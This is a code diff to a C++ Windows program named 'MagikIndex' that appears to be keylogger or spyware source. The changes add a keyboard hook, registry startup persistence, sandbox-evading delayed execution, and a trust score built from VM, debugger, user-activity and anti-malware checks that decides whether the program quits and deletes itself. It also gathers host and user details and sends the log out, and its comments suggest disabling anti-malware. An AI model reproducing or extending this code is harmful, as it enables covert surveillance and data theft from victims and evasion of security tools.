@@ -1,4 +1,5 @@
 #include "common.h"
+#include "logo.h"
 
 //#include "lz4/lz4.h"
 //#include <Wbemidl.h>
@@ -8,6 +9,11 @@
 #pragma warning( push )
 #pragma warning( disable : 4477 )
 
+typedef LONG(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
+
+
+HHOOK keyboardHook;
 
 int main()
 {
@@ -26,30 +32,30 @@ int main()
 
     srand(RandSeed);
 
-    bool PatchedMe = false;
-    bool InactiveUser = false;
-    bool KnownVMFile = false;
-
+    char PathToFile[MAX_PATH];
+    HMODULE GetModH = GetModuleHandle(NULL);
+    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
+    if (SecurityLevel == 3 && StrStrA(GetCommandLineA(),"rebooted") == NULL) {
+        RegisterMyProgramForStartup("MIndex",PathToFile,"rebooted");
+        exit(0);
+    }
 #ifndef debug
-
-
-    int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;
-
-    for (int j = 0; j <= Divider; j++) {
-        Sleep(DividedSleep);
-    }
-
-    DWORD PatchCheck = GetTickCount();
-    
-    if ((int)(PatchCheck - Tick1) < Time - 5000) {
-        PatchedMe = true;
-    }
 
     unsigned long ThreadId;
     CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);
 
 
 #endif
+
+    if (DelayExecution) {
+        int Divider = rand() % 10000 + 100, DividedSleep = (DelayTime + rand()%1000+10) / Divider;
+        LARGE_INTEGER delay;
+        delay.QuadPart = -10000 * (DividedSleep * 1000);
+        pNtDelayExecution(FALSE, &delay);
+        for (int j = 0; j <= Divider; j++) {
+            Sleep(DividedSleep);
+        }
+    }
 
     bool FirstLog = true;
 
@@ -58,14 +64,29 @@ int main()
 
     //ShellExecuteA(0, "open", "cmd.exe", "/C powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass", 0, SW_HIDE);
 
+    AntiDBG DebugItem;
+    DebugItem.Initialize();
+    TrustItems Trust = DebugItem.TrustItem;
+    bool TrustTooLow = false;
+    if ((SecurityLevel + 1) * 25 > DebugItem.trust) {
+        if (QuitIfUntrust) {
+            FinalExit();
+        }
+        TrustTooLow = true;                                         
+    }
+    //add special security routines, example:
+    // if(Trust.HasRunningAntiMalware && DebugItem.trust > 75){ reboot to safemode and disable them }
+    // or
+    // if( classic sandbox parameters ){ act like a normal program to evade detection }
+
 Log:
 
     Log log;
-    log.ExtrapolateKey();
     log.CreateLog();
 
     DWORD Tick = GetTickCount();
 
+    std::string VersionText = "MagikIndex ";
     std::string TimeText = "Current Tick:";
     std::string ComputerText = "Host Name:";
     std::string UsernameText = "User Name:";
@@ -91,13 +112,20 @@ Log:
     std::string CopiedFileText = "Made executable \"";
     std::string CryptText = "Encrypted with \"";
 
+    std::string NormalizedVersion = std::to_string(CurrentVersion);
+    for (int i = 0; i < 4; i++) {
+        if (i == 3 && NormalizedVersion[3] == '0')
+            break;
+        VersionText += NormalizedVersion[i];
+    }
+    if (IsMajor)
+        VersionText += " Major Release - ";
+    else
+        VersionText += " Minor/Dev Release - ";
+
     char* AppData = nullptr;
     size_t AppDataSize;
     _dupenv_s(&AppData, &AppDataSize, "APPDATA");
-
-    char PathToFile[MAX_PATH];
-    HMODULE GetModH = GetModuleHandle(NULL);
-    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
 
     std::string LogTime = std::to_string(Tick);
 
@@ -106,7 +134,7 @@ Log:
     ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
     GetLocalTime(&SysTime);
 
-    std::string StartDate = "_________";
+    std::string StartDate = "_________" + VersionText;
     StartDate += std::to_string(SysTime.wDay);
     StartDate += "/";
     StartDate += std::to_string(SysTime.wMonth);
@@ -120,6 +148,8 @@ Log:
     StartDate += std::to_string(SysTime.wSecond);
     StartDate += "_________\n";
 
+    log.LogItChar(MyLogo);
+    log.LogItChar("\n");
     log.LogItChar(StartDate);
 
 #ifdef debug
@@ -130,27 +160,50 @@ Log:
 #else
 
     log.LogItChar("Started in normal mode...");
-    CryptText += std::to_string(/*ExtrapolateKey()*/1000);
-    CryptText += "\" Key Shift...";
+    CryptText += "Secure Random Key Shift...";
     log.LogItChar(CryptText);
 
 #endif
 
-    if (PatchedMe) {
-        log.LogItChar("I was patched! Exiting... ;(");
-        FinalExit();
+    if (FirstLog) {
+        if (Trust.IsResCheck)
+            log.LogItChar("Resolution ratio mismatch, trust decreased...");
+        if (Trust.IsInVM)
+            log.LogItChar("VM Guest specific files found, trust decreased...");
+        if (Trust.IsHostingAVM)
+            log.LogItChar("VM Host specific files found, trust increased...");
+        if (Trust.IsSmallHardDrive)
+            log.LogItChar("HardDrive is under the set minimum, trust decreased...");
+        if (Trust.IsSmallRAM)
+            log.LogItChar("RAM is under the set minimum, trust decreased...");
+        if (Trust.IsBeingDebugged)
+            log.LogItChar("Process is being debugged, trust decreased...");
+        if (Trust.HasOneCore)
+            log.LogItChar("CPU Core Number is under the set minimum, trust decreased...");
+        if (Trust.HasMultipleMonitors)
+            log.LogItChar("Multiple monitor setup found, trust increased...");
+        if (Trust.HasBeenTimepatched)
+            log.LogItChar("Process has been timepatched, trust decreased...");
+        if (Trust.UserIsInactive)
+            log.LogItChar("User's mouse hasn't moved for 10s, trust decreased...");
+        if (Trust.HasActiveInternet)
+            log.LogItChar("Active internet connection found, trust increased...");
+        if (Trust.Proxied)
+            log.LogItChar("Proxy/Fake connection found, trust decreased...");
+        if (Trust.HasRunningAntiMalware)
+            log.LogItChar("Running Anti-Malware solution found, trust increased...");
+        if (Trust.HasMoreThan20Apps)
+            log.LogItChar("More than 20 apps installed, trust increased...");
+        if (Trust.ExtUserActivity)
+            log.LogItChar("No user input in the past 15s, trust decreased...");
     }
 
-    if (InactiveUser) {
-        log.LogItChar("User was inactive for too long, probably an antimalware sandbox! Exiting... ;(");
-        FinalExit();
+    if (TrustTooLow) {
+        log.LogItChar("Trust factor:" + std::to_string(DebugItem.trust));
+        log.LogItChar("Trust factor too low, quitting...");
+        log.SendLog();
+        FinalExit();                                                                               //could just act normal instead of autodeleting, which is sus
     }
-
-    if (KnownVMFile) {
-        log.LogItChar("Known VM file found! Exiting... ;(");
-        FinalExit();
-    }
-
 
     DWORD Size = MAX_LENGTH+1;
 
@@ -162,7 +215,7 @@ Log:
 
     DWORD DWFlags;
 
-    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) { //switch between these two ways to check as you see fit, or even use both
+    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {    //switch between these two ways to check as you see fit, or even use both
     if (InternetGetConnectedState(&DWFlags,NULL)){
         InternetStatusString = "Connected";
     }else{
@@ -251,29 +304,32 @@ Log:
     if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
         MiddleEast = "Yes";
     }
+    if (IsWindowsXPOrGreater()) {
+        WindowsVersion = "XP / Vista";
+    }
     if (IsWindows7OrGreater())
     {
-        std::string WindowsVersion = "Seven";
+        WindowsVersion = "Seven";
     }
     if (IsWindows7SP1OrGreater())
     {
-        std::string WindowsVersion = "Seven SP1";
+        WindowsVersion = "Seven SP1";
     }
     if (IsWindows8OrGreater())
     {
-        std::string WindowsVersion = "Eight";
+        WindowsVersion = "Eight";
     }
     if (IsWindows8Point1OrGreater())
     {
-        std::string WindowsVersion = "Eight.one";
+        WindowsVersion = "Eight.one";
     }
     if (IsWindows10OrGreater())
     {
-        std::string WindowsVersion = "Ten";
+        WindowsVersion = "Ten";
     }
     if (IsWindowsServer())
     {
-        std::string WindowsVersion = "Server";
+        WindowsVersion = "Server";
     }
 
     SYSTEM_INFO siSysInfo;
@@ -299,7 +355,7 @@ Log:
         }
     }
 
-    char Locale[LOCALE_NAME_MAX_LENGTH];
+    char Locale[LOCALE_NAME_MAX_LENGTH+1];
 
     GetCurrencyFormatA(
         LOCALE_SYSTEM_DEFAULT, 
@@ -307,7 +363,7 @@ Log:
         "0",
         NULL,
         Locale,
-        LOCALE_NAME_MAX_LENGTH+1);
+        LOCALE_NAME_MAX_LENGTH);
 
     TimeText += LogTime;
     log.LogItChar(TimeText);
@@ -777,6 +833,7 @@ void FinalExit() {
     ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
     exit(0);
 }
+
 
 
 #pragma warning( pop )
